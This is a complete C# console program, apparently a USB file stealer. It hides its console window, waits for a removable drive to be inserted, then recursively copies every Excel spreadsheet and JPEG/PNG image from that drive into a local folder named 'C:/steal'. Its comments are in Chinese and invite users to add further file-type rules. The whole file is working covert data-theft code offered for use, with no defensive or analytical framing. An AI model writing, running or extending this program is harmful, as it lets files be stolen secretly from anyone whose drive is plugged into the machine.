using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.Runtime.InteropServices;

namespace FlashFileGetter
{
    class Program
    {
        /// <summary>
        /// 隐藏窗口需要
        /// </summary>

        [DllImport("kernel32.dll")]//隐藏/显示窗口必需
        static extern IntPtr GetConsoleWindow();//隐藏/显示窗口必需

        [DllImport("user32.dll")]//隐藏/显示窗口必需
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);//隐藏/显示窗口必需

        const int SW_HIDE = 0;//隐藏/显示窗口必需
        const int SW_SHOW = 5;//隐藏/显示窗口必需

        public static bool FileGetted = false;

        public static string NewDisk = "";

        static void Main(string[] args)
        {
            Console.Beep();
            Console.WriteLine("[提示]开始运行");
            HideConsole(true);

            while (FileGetted==false)
            {
                PatternChecker();
                if (NewDisk.Length > 0)
                {
                    try
                    {
                        FileScanner();
                    }
                    catch (System.UnauthorizedAccessException)
                    {
                        Console.WriteLine("[警告]:访问被拒绝");
                        FileGetted = false;
                    }
                    catch (System.IO.DirectoryNotFoundException)
                    {
                        Console.WriteLine("[失败]:新盘符被弹出");
                        FileGetted = false;
                    }
                }
            }
            //Console.WriteLine("END");
            //Console.ReadLine();
            Console.WriteLine("[提示]运行完毕");
            Console.Beep(800, 800);
            Environment.Exit(0);
        }

        static void HideConsole(bool IsHide)
        {
            var handle = GetConsoleWindow();
            if (IsHide == true)
            {
                // Hide
                ShowWindow(handle, SW_HIDE);
            }
            else
            {
                // Show
                ShowWindow(handle, SW_SHOW);
            }
        }

        static void FindFile(DirectoryInfo di)
        {
            FileInfo[] fis = di.GetFiles();
            for (int i = 0; i < fis.Length; i++)
            {
                string realfilename = "";
                string filename = fis[i].FullName;
                string filekind = "";
                bool isDot = false;
                foreach (char x in filename)
                {
                    realfilename += x.ToString();
                    if (isDot == true)
                    {
                        filekind += x.ToString();
                    }
                    if (x.ToString() == ".")
                    {
                        filekind = ".";
                        isDot = true;
                    }
                    if (x.ToString() == "\\")
                    {
                        filekind = "";
                        realfilename = "";
                        isDot = false;
                    }
                }
                isDot = false;
                Console.WriteLine("文件：" + filename + "类型:" + filekind);

                if (Directory.Exists("C:/steal")==false)
                {
                    Directory.CreateDirectory("C:/steal");
                }
                //自行添加规则
                try
                {
                    switch (filekind)
                    {
                        case ".xls":
                            File.Copy(filename, "C:/steal/" + realfilename);
                            break;
                        case ".xlsx":
                            File.Copy(filename, "C:/steal/" + realfilename);
                            break;
                        case ".jpeg":
                            File.Copy(filename, "C:/steal/" + realfilename);
                            break;
                        case ".png":
                            File.Copy(filename, "C:/steal/" + realfilename);
                            break;
                        case ".jpg":
                            File.Copy(filename, "C:/steal/" + realfilename);
                            break;
                    }
                }
                catch (System.IO.IOException)
                {
                    Console.WriteLine("[提示]文件已存在，跳过复制");
                }
            }
            DirectoryInfo[] dis = di.GetDirectories();
            for (int j = 0; j < dis.Length; j++)
            {
                Console.WriteLine("目录：" + dis[j].FullName);
                FindFile(dis[j]);
            }
        }

        static void FileScanner()//文件扫描
        {
            DirectoryInfo di = new DirectoryInfo(NewDisk);
            FindFile(di);
            NewDisk = "";
            FileGetted = true;
        }

        static void PatternChecker()
        {
            int drivesCount = Directory.GetLogicalDrives().Length;//获取盘符数
            int lastDriveCount = drivesCount;
            string OldPatternList;
            string PatternList = "";
            Console.WriteLine("[检查盘符]");
            do
            {
                Console.WriteLine("获取盘符数:{0}", lastDriveCount);
                //string[] Pattern = Directory.GetLogicalDrives();
                //PatternList = "";
                //foreach (string SinglePattern in Pattern)
                //{
                //    PatternList += SinglePattern;
                //}
                PatternList = GetPatternList();
                Console.WriteLine(PatternList);
                OldPatternList = PatternList;
                Thread.Sleep(1000);
            }
            while (Directory.GetLogicalDrives().Length == lastDriveCount);
            Console.WriteLine("[报告] 盘符数发生变化:{0}=>{1}", lastDriveCount, Directory.GetLogicalDrives().Length);

            PatternList = GetPatternList();
            if (PatternList.Length > OldPatternList.Length)
            {
                //插入盘
                Console.WriteLine("[动作] 插入盘:{0}:\\", StringMinus(OldPatternList, PatternList));
                NewDisk = StringMinus(OldPatternList, PatternList) + ":/";
            }
            else
            {
                //拔出盘
                Console.WriteLine("[动作] 拔出盘:{0}:\\", StringMinus(PatternList, OldPatternList));
            }
            Console.WriteLine("[End]=>PatternChecker");
        }

        static string GetPatternList()//获取有效盘符列表
        {
            string PatternList = "";
            string[] Pattern1 = Directory.GetLogicalDrives();
            PatternList = "";
            foreach (string SinglePattern in Pattern1)
            {
                PatternList += SinglePattern;
            }
            return PatternList;
        }

        //字符串相减
        static string StringMinus(string str1, string str2)//str1>str2
        {
            string result = "";
            foreach (char x in str2)
            {
                if (str1.IndexOfAny(x.ToString().ToArray()) == -1)
                {
                    result += x.ToString();
                }
            }
            return result;
        }
    }
}
